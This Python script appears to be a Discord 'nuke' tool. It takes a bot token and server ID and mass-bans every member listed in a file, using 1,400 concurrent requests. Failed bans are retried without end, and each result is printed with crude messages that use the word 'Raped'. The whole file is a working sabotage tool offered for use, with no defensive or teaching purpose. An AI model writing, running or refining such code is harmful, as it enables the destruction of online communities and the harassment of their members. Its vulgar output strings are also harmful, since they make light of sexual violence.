import aiohttp, tasksio, asyncio, random, os

class Nuke:

    def __init__(self):
        self.clear = lambda: os.system('cls & mode 80, 23 ')
        self.clear()

        self.token, self.guild = input("Bot Token -> "), input('Guild ID -> ')
        self.headers = {"Authorization": "Bot {}".format(self.token)}
        self.api = random.randint(6, 9); self.ban_reason = 'villainlovesyou'
    
        self.tasks = 1400 #->// Change This To The Amount Of Tasks

    async def execute(self, members):
        try:
            async with aiohttp.ClientSession(headers=self.headers) as session:
                async with session.put("https://discord.com/api/v{0}/guilds/{1}/bans/{2}?reason={3}".format(self.api, self.guild, members, self.ban_reason)) as response:
                    if response.status == 200:
                        print("Succesfully Raped -> {}".format(members))
                    else:
                        print("Failed To Rape ->  {}".format(members))
                    return await self.execute(members)
        except Exception:
            print(f"-> There Was An Error Sending Requests ->")
            return await self.execute(members)

    async def start(self):
        async with tasksio.TaskPool(self.tasks) as pool:
            while True:
                for member in open("members.txt").read().splitlines():
                    await pool.put(self.execute(member))     
     
if __name__ == "__main__":
    client = Nuke()
    asyncio.get_event_loop().run_until_complete(client.start())




